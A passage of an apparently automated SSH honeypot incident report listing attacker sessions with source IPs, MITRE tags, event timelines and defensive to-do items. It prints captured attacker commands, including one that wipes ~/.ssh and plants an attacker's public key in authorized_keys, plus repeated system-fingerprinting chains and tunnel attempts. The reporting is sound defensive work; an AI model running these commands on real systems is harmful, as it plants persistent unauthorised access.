| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:09:08` | `cowrie.session.connect` |
| `2026-07-26 04:09:08` | `cowrie.client.version` |
| `2026-07-26 04:09:08` | `cowrie.client.kex` |
| `2026-07-26 04:09:09` | `cowrie.login.success` |
| `2026-07-26 04:09:10` | `cowrie.session.params` |
| `2026-07-26 04:09:10` | `cowrie.command.input` |
| `2026-07-26 04:09:10` | `cowrie.command.failed` |
| `2026-07-26 04:09:11` | `cowrie.log.closed` |
| `2026-07-26 04:09:12` | `cowrie.session.params` |
| `2026-07-26 04:09:12` | `cowrie.command.input` |
| `2026-07-26 04:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.38[.]87` to AbuseIPDB if not already reported
- [ ] Block `115.191.38[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3608186cbd

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-07-26 04:09 |
| **Last Seen** | 2026-07-26 04:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:09:45` | `cowrie.session.connect` |
| `2026-07-26 04:09:46` | `cowrie.client.version` |
| `2026-07-26 04:09:46` | `cowrie.client.kex` |
| `2026-07-26 04:09:49` | `cowrie.login.success` |
| `2026-07-26 04:09:49` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dce0121b9ba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:10 |
| **Last Seen** | 2026-07-26 04:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:10:11` | `cowrie.session.connect` |
| `2026-07-26 04:10:11` | `cowrie.client.version` |
| `2026-07-26 04:10:11` | `cowrie.client.kex` |
| `2026-07-26 04:10:12` | `cowrie.login.success` |
| `2026-07-26 04:10:13` | `cowrie.session.params` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.success` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.command.input` |
| `2026-07-26 04:10:13` | `cowrie.log.closed` |
| `2026-07-26 04:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c292ece9ffc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:11 |
| **Last Seen** | 2026-07-26 04:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:11:46` | `cowrie.session.connect` |
| `2026-07-26 04:11:47` | `cowrie.client.version` |
| `2026-07-26 04:11:47` | `cowrie.client.kex` |
| `2026-07-26 04:11:47` | `cowrie.login.success` |
| `2026-07-26 04:11:48` | `cowrie.session.params` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.success` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.command.input` |
| `2026-07-26 04:11:48` | `cowrie.log.closed` |
| `2026-07-26 04:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a719f85f7c8f

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-26 04:13 |
| **Last Seen** | 2026-07-26 04:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:13:10` | `cowrie.session.connect` |
| `2026-07-26 04:13:11` | `cowrie.client.version` |
| `2026-07-26 04:13:11` | `cowrie.client.kex` |
| `2026-07-26 04:13:11` | `cowrie.login.success` |
| `2026-07-26 04:13:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743b51fc441f

| Field | Detail |
|---|---|
| **Source IP** | `117.205.3[.]26` |
| **First Seen** | 2026-07-26 04:13 |
| **Last Seen** | 2026-07-26 04:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:13:21` | `cowrie.session.connect` |
| `2026-07-26 04:13:22` | `cowrie.client.version` |
| `2026-07-26 04:13:22` | `cowrie.client.kex` |
| `2026-07-26 04:13:24` | `cowrie.login.success` |
| `2026-07-26 04:13:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `117.205.3[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07c238af809f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:13 |
| **Last Seen** | 2026-07-26 04:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:13:25` | `cowrie.session.connect` |
| `2026-07-26 04:13:25` | `cowrie.client.version` |
| `2026-07-26 04:13:25` | `cowrie.client.kex` |
| `2026-07-26 04:13:26` | `cowrie.login.success` |
| `2026-07-26 04:13:27` | `cowrie.session.params` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.success` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.command.input` |
| `2026-07-26 04:13:27` | `cowrie.log.closed` |
| `2026-07-26 04:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0940f6d0f819

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-07-26 04:13 |
| **Last Seen** | 2026-07-26 04:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:13:39` | `cowrie.session.connect` |
| `2026-07-26 04:13:40` | `cowrie.client.version` |
| `2026-07-26 04:13:40` | `cowrie.client.kex` |
| `2026-07-26 04:13:41` | `cowrie.login.success` |
| `2026-07-26 04:13:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c0ab11a8f11

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:15 |
| **Last Seen** | 2026-07-26 04:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:15:03` | `cowrie.session.connect` |
| `2026-07-26 04:15:04` | `cowrie.client.version` |
| `2026-07-26 04:15:04` | `cowrie.client.kex` |
| `2026-07-26 04:15:05` | `cowrie.login.success` |
| `2026-07-26 04:15:06` | `cowrie.session.params` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.success` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.command.input` |
| `2026-07-26 04:15:06` | `cowrie.log.closed` |
| `2026-07-26 04:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1afb6632b108

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:16 |
| **Last Seen** | 2026-07-26 04:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:16:50` | `cowrie.session.connect` |
| `2026-07-26 04:16:50` | `cowrie.client.version` |
| `2026-07-26 04:16:50` | `cowrie.client.kex` |
| `2026-07-26 04:16:51` | `cowrie.login.success` |
| `2026-07-26 04:16:52` | `cowrie.session.params` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.success` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.command.input` |
| `2026-07-26 04:16:52` | `cowrie.log.closed` |
| `2026-07-26 04:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50bd09187fb3

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-26 04:16 |
| **Last Seen** | 2026-07-26 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:16:50` | `cowrie.session.connect` |
| `2026-07-26 04:16:51` | `cowrie.client.version` |
| `2026-07-26 04:16:51` | `cowrie.client.kex` |
| `2026-07-26 04:16:52` | `cowrie.login.success` |
| `2026-07-26 04:16:53` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d394da93f50f

| Field | Detail |
|---|---|
| **Source IP** | `121.66.63[.]186` |
| **First Seen** | 2026-07-26 04:16 |
| **Last Seen** | 2026-07-26 04:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:16:59` | `cowrie.session.connect` |
| `2026-07-26 04:17:01` | `cowrie.client.version` |
| `2026-07-26 04:17:01` | `cowrie.client.kex` |
| `2026-07-26 04:17:03` | `cowrie.login.success` |
| `2026-07-26 04:17:04` | `cowrie.direct-tcpip.request` |
| `2026-07-26 04:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.66.63[.]186` to AbuseIPDB if not already reported
- [ ] Block `121.66.63[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e81657d4c90

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:18 |
| **Last Seen** | 2026-07-26 04:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:18:39` | `cowrie.session.connect` |
| `2026-07-26 04:18:39` | `cowrie.client.version` |
| `2026-07-26 04:18:39` | `cowrie.client.kex` |
| `2026-07-26 04:18:40` | `cowrie.login.success` |
| `2026-07-26 04:18:41` | `cowrie.session.params` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.success` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.command.input` |
| `2026-07-26 04:18:41` | `cowrie.log.closed` |
| `2026-07-26 04:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71223044939d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:20 |
| **Last Seen** | 2026-07-26 04:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:20:23` | `cowrie.session.connect` |
| `2026-07-26 04:20:24` | `cowrie.client.version` |
| `2026-07-26 04:20:24` | `cowrie.client.kex` |
| `2026-07-26 04:20:25` | `cowrie.login.success` |
| `2026-07-26 04:20:26` | `cowrie.session.params` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.success` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.command.input` |
| `2026-07-26 04:20:26` | `cowrie.log.closed` |
| `2026-07-26 04:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e6bb6de2ae

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:21 |
| **Last Seen** | 2026-07-26 04:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:21:53` | `cowrie.session.connect` |
| `2026-07-26 04:21:54` | `cowrie.client.version` |
| `2026-07-26 04:21:54` | `cowrie.client.kex` |
| `2026-07-26 04:21:55` | `cowrie.login.success` |
| `2026-07-26 04:21:56` | `cowrie.session.params` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.success` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.command.input` |
| `2026-07-26 04:21:56` | `cowrie.log.closed` |
| `2026-07-26 04:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da9c6e5f46d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 04:23 |
| **Last Seen** | 2026-07-26 04:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
